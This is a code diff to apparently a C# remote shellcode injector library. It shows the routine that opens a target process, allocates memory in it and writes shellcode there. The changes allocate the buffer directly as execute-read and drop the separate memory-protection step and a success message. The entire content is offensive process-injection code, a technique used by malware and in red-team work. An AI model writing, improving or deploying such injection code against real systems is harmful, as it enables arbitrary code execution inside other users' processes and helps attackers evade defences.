@@ -45,7 +45,7 @@ namespace RemoteCodeInjector.Library
             IntPtr hProcess;
             IntPtr hThread;
             IntPtr pShellcodeBuffer;
-            var baseProtection = MEMORY_PROTECTION.READWRITE;
+            string addressFormat = Environment.Is64BitProcess ? "X16" : "X8";
 
             Console.WriteLine("[>] Trying to write open the target process.");
 
@@ -76,7 +76,7 @@ namespace RemoteCodeInjector.Library
                     IntPtr.Zero,
                     shellcode.Length,
                     ALLOCATION_TYPE.COMMIT | ALLOCATION_TYPE.RESERVE,
-                    baseProtection);
+                    MEMORY_PROTECTION.EXECUTE_READ);
                 status = (pShellcodeBuffer != IntPtr.Zero);
 
                 if (!status)
@@ -89,7 +89,7 @@ namespace RemoteCodeInjector.Library
                 }
                 else
                 {
-                    Console.WriteLine("[+] Shellcode buffer is allocated at 0x{0}.", pShellcodeBuffer.ToString("X16"));
+                    Console.WriteLine("[+] Shellcode buffer is allocated at 0x{0}.", pShellcodeBuffer.ToString(addressFormat));
                 }
 
                 Console.WriteLine("[>] Trying to write shellcode to the target process.");
@@ -105,28 +105,6 @@ namespace RemoteCodeInjector.Library
                 {
                     error = Marshal.GetLastWin32Error();
                     Console.WriteLine("[-] Failed to write shellcode.");
-                    Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(error, false));
-
-                    break;
-                }
-                else
-                {
-                    Console.WriteLine("[+] {0} bytes shellcode are written successfully.", nWrittenBytes);
-                }
-
-                Console.WriteLine("[>] Trying to update memory protection for shellcode buffer.");
-
-                status = NativeMethods.VirtualProtectEx(
-                    hProcess,
-                    pShellcodeBuffer,
-                    new SIZE_T((uint)shellcode.Length),
-                    MEMORY_PROTECTION.EXECUTE_READ,
-                    ref baseProtection);
-
-                if (!status)
-                {
-                    error = Marshal.GetLastWin32Error();
-                    Console.WriteLine("[-] Failed to update memory protection for shellcode buffer.");
                     Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(error, false));
 
                     break;
